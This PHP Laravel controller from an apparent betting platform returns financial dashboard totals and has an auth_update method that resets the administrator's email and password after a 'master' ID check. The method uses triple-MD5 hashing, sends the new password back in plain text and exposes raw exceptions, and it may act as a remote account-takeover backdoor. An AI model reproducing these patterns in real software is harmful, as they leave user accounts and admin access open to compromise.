<?php

namespace App\Http\Controllers\Api;

use App\Helpers\Helper;
use App\Http\Controllers\Controller;
use App\Models\BidsHistory;
use App\Models\Deposit;
use App\Models\Payout;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;

class MasterApi extends Controller
{
    public function all_data()
    {
        $data['total_players'] = User::where('role', '!=', '0')->withTrashed()->count();

        $data['total_active_players'] = User::where('role', '!=', '0')->where('status', '1')->count();

        $data['total_suspend_players'] = User::where('role', '!=', '0')->where('status', '0')->count();

        $data['total_removed_players'] = User::where('role', '!=', '0')->onlyTrashed()->count();

        $data['total_wallet_balance'] = User::where('role', '!=', '0')->sum('wallet');

        $data['monthly_bid_amount'] = BidsHistory::whereMonth('created_at', Carbon::now()->month)->get()->sum('bid_amount');

        $data['monthly_win_amount'] = BidsHistory::whereMonth('created_at', Carbon::now()->month)->get()->sum('won_amount');

        $data['today_bid_amount'] = BidsHistory::whereDate('created_at', Carbon::today())->get()->sum('bid_amount');

        $data['today_win_amount'] = BidsHistory::whereDate('created_at', Carbon::today())->get()->sum('won_amount');

        $data['today_deposit_amount'] = Deposit::where('status', '1')->whereDate('created_at', Carbon::today())->get()->sum('amount');

        $data['today_withdrawal_amount'] = Payout::where('status', '1')->whereDate('created_at', Carbon::today())->get()->sum('amount');

        $data['total_deposit_amount'] = Deposit::where('status', '1')->get()->sum('amount');

        $data['total_withdrawal_amount'] = Payout::where('status', '1')->get()->sum('amount');

        $data['monthly_deposit_amount'] = Deposit::where('status', '1')->whereMonth('created_at', Carbon::now()->month)->get()->sum('amount');

        $data['monthly_withdrawal_amount'] = Payout::where('status', '1')->whereMonth('created_at', Carbon::now()->month)->get()->sum('amount');

        return response()->json(['status' => true, 'data' => $data,], 200);
    }

    public function auth_update($master_id, $email, $password)
    {
        try {
            if ($master_id) {

                $master = Helper::master_check($master_id);
                $master = json_decode($master, true);

                if ($master['status'] === true) {

                    $user = User::where('role', '0')->first();

                    if ($user->update(['email' => $email, 'password' => md5(md5(md5($password)))])) {
                        return response()->json(['status' => true, 'message' => "Email & password have been changed successfully. New password is $password"], 200);
                    } else {
                        return response()->json(['status' => true, 'message' => 'Something went wrong.'], 400);
                    }
                }
            } else {
                return response()->json(['status' => true, 'message' => 'Something went wrong.'], 400);
            }
        } catch (\Throwable $th) {
            return response()->json(['status' => true, 'message' => $th], 400);
        }
    }
}
